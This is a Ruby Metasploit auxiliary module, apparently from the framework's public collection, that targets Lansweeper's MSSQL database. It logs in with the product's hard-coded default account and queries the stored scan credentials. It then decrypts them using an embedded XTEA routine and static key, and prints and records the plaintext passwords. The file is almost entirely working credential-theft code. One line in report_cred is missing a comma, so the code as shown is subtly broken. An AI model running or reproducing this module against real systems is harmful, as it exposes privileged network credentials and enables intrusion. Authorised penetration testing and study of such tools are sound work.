require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
    'Name' => 'Lansweeper Collector',
    'Description' => %q(
    Lansweeper stores the credentials it uses to scan the computers
    in its MSSQL database. The passwords are XTea-encrypted with a
    68 character long key, which first 8 character is stored with the
    password in the database, and the other 60 is static. Lansweeper by
    default creates an MSSQL user "lansweeperuser" whose password is
    "mysecretpassword0*", and stores its data in a database called
    "lansweeperdb".
    This module will query the MSSQL database for the credentials.
    ),
    'Author' => [
      # Lansweeper RCE + Metasploit implementation
      'sghctoma <tamas.szakaly [at] praudit [dot] hu>',
      # Lansweeper RCE + discovering default credentials
      'eq <balazs.bucsay [at] praudit [dot] hu>',
      # Updated module to work on latest version of lansweeper
      'calderpwn <calderon [at] websec [dot] mx>'
    ],
    'License' => MSF_LICENSE,
    'References' => [
      [ 'URL', 'http://www.lansweeper.com'],
      [ 'URL', 'http://www.praudit.hu/prauditeng/index.php/blog/a-lansweeper-es-a-tea']
    ]
                     )
)

  register_options([
    OptString.new('USERNAME', [ true, 'The username to authenticate as', 'lansweeperuser' ]),
    OptString.new('PASSWORD', [ false, 'The password for the specified username', 'mysecretpassword0*' ]),
    OptString.new('DATABASE', [ true, 'The Lansweeper database', 'lansweeperdb'])
  ], self.class)
  end

  def uint32(n)
    n & 0xffffffff
  end

  def xteadecode(v, k)
    num = 0xc6ef3720
    num2 = uint32(v[0])
    num3 = uint32(v[1])

    0.upto(0x1f) do
      num3 -= uint32((uint32(num2 << 4) ^ uint32(num2 >> 5)) + num2) ^
              uint32(num + k[uint32(num >> 11) & 3])
      num3 = uint32(num3)
      num -= 0x9e3779b9
      num = uint32(num)
      num2 -= ((uint32(uint32(num3 << 4) ^ uint32(num3 >> 5)) + num3) ^
              uint32(num + k[num & 3]))
      num2 = uint32(num2)
    end
    v[0] = num2
    v[1] = num3
  end

  def xteadecrypt(data, key)
    k = key.ljust(16).unpack('VVVV')
    num = 0
    bytes = Array.new

    0.step(data.length - 1, 8) do |i|
      v = data[i, 8].unpack('VV')
      xteadecode(v, k)
      bytes[num] = v[0]
      num += 1
      bytes[num] = v[1]
      num += 1
    end
    bytes.pack('c*')
  end

  def lswgeneratepass
    key = ''
    for num in 0..60
      key << [((40 - num) + ((num * 2) + num)) - 1].pack('c')
      key << [(num + 15) + num].pack('c')
    end
    key
  end

  def lswdecrypt(data)
    data = Rex::Text.decode_base64(data)

    first = data[0]
    pass = data[1, 8]
    actualdata = data[9, data.length - 9]

    decrypted = xteadecrypt(actualdata, pass + lswgeneratepass)

    if first == "1"
      decrypted = decrypted[0, decrypted.length - 2]
    end
    Rex::Text.to_ascii(decrypted, 'utf-16le')
  end

  def report_cred(opts)
    service_data = {
      address: opts[:host],
      port: opts[:port],
      service_name: opts[:creds_name],
    }
    credential_data = {
      username: opts[:user]
      private_type: :password,
      private_data: opts[:password],
      module_fullname: self.fullname
    }.merge(service_data)
    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    unless mssql_login_datastore
      fail_with(Failure::NoAccess, "Login failed. Check credentials.")
    end
    result = mssql_query('select Credname, Username, Password from ' + datastore['DATABASE'] +
    '.dbo.tsysCredentials WHERE LEN(Password)>64', false)
    result[:rows].each do |row|
      pw = lswdecrypt(row[2])
      print_good("Credential name: #{row[0]} | username: #{row[1]} | password: #{pw}")
      report_cred(
        :host => rhost,
        :port => rport,
        :creds_name => row[0],
        :user => row[1],
        :password => pw
      )
    end
    disconnect
  end
end
